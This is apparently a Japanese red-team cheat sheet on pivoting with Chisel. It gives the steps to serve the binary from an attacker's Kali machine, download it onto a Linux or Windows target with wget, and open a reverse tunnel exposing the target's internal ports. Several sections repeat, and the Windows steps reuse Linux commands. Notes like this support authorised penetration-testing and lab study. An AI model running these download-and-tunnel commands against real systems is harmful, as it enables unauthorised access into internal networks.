---
title: Chisel
parent: Pivot
grand_parent: Red Team
nav_order: 1
---

# Usage

## Chiselの使い方

## 目次
1. [Chisel](#chisel)
   - [Chiselクライアントの準備](#chiselクライアントの準備)
   - [Chiselサーバの起動](#chiselサーバの起動)
   - [ローカルポートフォワーディング](#ローカルポートフォワーディング)
   - [ターゲットマシン(Ubuntu)](#ターゲットマシンubuntu)
   - [ターゲットマシン(Windows)](#ターゲットマシン(WIndows))
   - [攻撃マシン(Kali)の操作](#攻撃マシンkaliの操作)

## Chisel

### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)

### ローカルポートフォワーディング

#### Attacker Machine (Kali)
1. Chiselクライアントの準備  
   - ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
     [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)
   - ファイル名の変更  
     - Linux用: `mv chisel_1.8.1_linux_amd64.gz chisel`
     - Windows用: `mv chisel_1.8.1_windows_amd64.gz chisel`

2. ウェブサーバの起動
```bash
python3 -m http.server
```

3. 別のターミナルでChiselサーバを起動
```bash
chisel server -p 8050 --reverse
```
- server
- -p 8050 
- --reverse

### ターゲットマシン(Ubuntu)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
./chisel client 10.10.14.120:8050 R:9000:127.0.0.1:9000
```
- client 
- 10.10.14.120:8050 
- R:9000
- 127.0.0.1:9000  
### 攻撃マシン(Kali)の操作
- 攻撃マシンのブラウザで `127.0.0.1:9000` にアクセスすると、ターゲットの `127.0.0.1:9000` にアクセス可能

---

# Server

## ローカルポートフォワーディング

#### Attacker Machine (Kali)
1. Chiselクライアントの準備  
   - ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
     [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)
   - ファイル名の変更  
     - Linux用: `mv chisel_1.8.1_linux_amd64.gz chisel`
     - Windows用: `mv chisel_1.8.1_windows_amd64.gz chisel`

2. ウェブサーバの起動
```bash
python3 -m http.server
```

3. 別のターミナルでChiselサーバを起動
```bash
chisel server -p 8050 --reverse
```
- server
- -p 8050 
- --reverse

---

# Target

## Linux

### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)

### ターゲットマシン(Ubuntu)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
./chisel client 10.10.14.120:8050 R:9000:127.0.0.1:9000
```
- client 
- 10.10.14.120:8050 
- R:9000
- 127.0.0.1:9000  

## Windows

### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)



### ターゲットマシン(Windows)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
.\chisel.exe client 192.168.45.218:8050 R:8080:127.0.0.1:80
```
- client 
- 192.168.45.218:8050
- R:8080
- 127.0.0.1:80  ターゲットの80番ポート

![](../../assets/images/Pasted%20image%2020260508222935.png)

---

